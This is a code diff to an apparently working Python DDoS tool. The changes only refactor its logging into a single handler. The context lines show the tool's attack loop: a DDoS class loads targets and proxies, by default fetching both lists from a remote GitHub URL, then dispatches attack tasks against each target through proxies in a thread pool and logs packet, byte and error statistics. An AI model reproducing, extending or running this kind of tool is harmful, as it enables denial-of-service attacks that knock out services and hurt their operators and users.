@@ -14,26 +14,23 @@ from files.config import *
 from files.stats import *
 from requests import adapters
 
-class LogSaver(logging.Handler):
+class MyHandler(logging.Handler):
     def __init__(self, file_path):
         super().__init__()
         self.__file = open(file_path, 'w')
 
     def emit(self, record: logging.LogRecord):
-        self.__file.write(self.format(record) + '\n')
+        message = self.format(record)
+        self.__file.write(message + '\n')
         self.__file.flush()
+        if not record.levelname in ['DEBUG', 'ERROR']:
+            print(message)
 
-console_handler = logging.StreamHandler(stream=sys.stdout)
-console_handler.setFormatter(logging.Formatter(fmt='[%(asctime)s: %(levelname)s] %(message)s'))
-console_log = logging.getLogger('console')
-console_log.setLevel(logging.DEBUG)
-file_log = logging.getLogger('file')
-file_log.setLevel(logging.DEBUG)
-my_logsaver = LogSaver('log.txt')
-my_logsaver.setFormatter(logging.Formatter(fmt='[%(asctime)s: %(levelname)s] %(message)s'))
-file_log.addHandler(my_logsaver)
-console_log.addHandler(my_logsaver)
-console_log.addHandler(console_handler)
+my_handler = MyHandler('log.txt')
+my_handler.setFormatter(logging.Formatter(fmt='[%(asctime)s: %(levelname)s] %(message)s'))
+logger = logging.getLogger('logger')
+logger.setLevel(logging.DEBUG)
+logger.addHandler(my_handler)
 
 config = load_config()
 
@@ -42,26 +39,26 @@ class DDoS:
         if os.path.isfile('targets.txt'):
             self.__target_manager.load_from_file('targets.txt')
         else:
-            console_log.info('File targets.txt not found. Loading default targets...')
+            logger.info('File targets.txt not found. Loading default targets...')
             data = requests.get('https://raw.githubusercontent.com/NonExistentUsername/ddos_data/main/targets.txt')
             self.__target_manager.load_from_list((data.content.decode('utf-8')).split('\n'))
         
-        console_log.info('Loaded targets: {0}'.format(len(self.__target_manager)))
+        logger.info('Loaded targets: {0}'.format(len(self.__target_manager)))
         if len(self.__target_manager) == 0:
-            console_log.critical('No targets!')
+            logger.critical('No targets!')
             exit(0)
 
         if os.path.isfile('proxies.txt'):
             self.__proxy_manager.load_from_file('proxies.txt', config)
         else:
-            console_log.info('File proxies.txt not found. Loading default proxies...')
+            logger.info('File proxies.txt not found. Loading default proxies...')
             data = requests.get('https://raw.githubusercontent.com/NonExistentUsername/ddos_data/main/proxies.txt')
             self.__proxy_manager.load_from_list((data.content.decode('utf-8')).split('\n'), config)
 
 
-        console_log.info('loaded proxies: {0}'.format(len(self.__proxy_manager)))
+        logger.info('loaded proxies: {0}'.format(len(self.__proxy_manager)))
         if len(self.__proxy_manager) == 0:
-            console_log.critical('No proxies!')
+            logger.critical('No proxies!')
             exit(0)
         
         self.__proxy_manager.build_tree()
@@ -92,7 +89,7 @@ class DDoS:
                 if proxy != None:
                     pool.add_task(Task(self.__weapon.attack, args=(target, proxy)))
                 else:
-                    console_log.warning('Skipped target: {0}'.format(target))
+                    logger.warning('Skipped target: {0}'.format(target))
 
         pool.join()
 
@@ -173,8 +170,8 @@ def print_stat(timeout = 60):
         
         delta_errors_p = 'Proxy connection errors in the last {0} seconds: {2:.1f}% ({1})'.format(timeout, convert_cnt(delta_errors), delta_errors/(proxy_connections)*100)
         message_text = '\n' + packages_stats + '\n' + bytes + '\n' + delta_successful_message + '\n' + delta_errors_p
-        console_log.info(message_text)
-        console_log.info('-------------------')
+        logger.info(message_text)
+        logger.info('-------------------')
         t = timeout - (get_ms_time() - ms_start) / 1000.
         if t > 0:
             time.sleep(t)
